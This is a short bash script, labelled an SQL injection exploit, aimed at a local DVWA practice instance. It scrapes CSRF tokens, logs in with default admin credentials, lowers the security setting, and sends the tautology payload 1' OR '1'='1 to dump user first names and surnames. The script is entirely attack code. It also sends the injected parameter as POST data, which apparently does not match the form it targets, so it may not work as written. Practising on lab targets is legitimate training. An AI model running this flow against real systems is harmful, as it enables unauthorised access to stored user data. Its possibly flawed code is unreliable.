#!/bin/bash

# SQL Injection Exploit Script for DVWA (Low Security)

# Configuration
DVWA_URL="http://127.0.0.1/dvwa"
LOGIN_URL="$DVWA_URL/login.php"
INJECTION_URL="$DVWA_URL/vulnerabilities/sqli/"
COOKIE_FILE="cookies.txt"
USERNAME="admin"
PASSWORD="password"
SECURITY_LEVEL="low"

# Step 1: Get CSRF token for login
echo "[*] Getting login CSRF token..."
TOKEN=$(curl -s -c $COOKIE_FILE "$LOGIN_URL" | grep 'user_token' | sed 's/.*value="\([^"]*\)".*/\1/')

# Step 2: Log in and save session cookies
echo "[*] Logging in as $USERNAME..."
curl -s -b $COOKIE_FILE -c $COOKIE_FILE -d "username=$USERNAME&password=$PASSWORD&Login=Login&user_token=$TOKEN" "$LOGIN_URL" > /dev/null

# Step 3: Set DVWA security level to Low
echo "[*] Setting DVWA security level to low..."
SECURITY_URL="$DVWA_URL/security.php"
SEC_TOKEN=$(curl -s -b $COOKIE_FILE "$SECURITY_URL" | grep 'user_token' | sed 's/.*value="\([^"]*\)".*/\1/')
curl -s -b $COOKIE_FILE -d "security=$SECURITY_LEVEL&seclev_submit=Submit&user_token=$SEC_TOKEN" "$SECURITY_URL" > /dev/null

# Step 4: Perform SQL Injection
echo "[*] Launching SQL Injection attack..."
PAYLOAD="1' OR '1'='1"
RESPONSE=$(curl -s -b $COOKIE_FILE "$INJECTION_URL" --data "id=$PAYLOAD&Submit=Submit")

# Step 5: Extract and display result
echo "[*] Extracted user data:"
echo "$RESPONSE" | grep -oP 'First name:.*?Surname:.*?<br>' | sed 's/<br>//g'
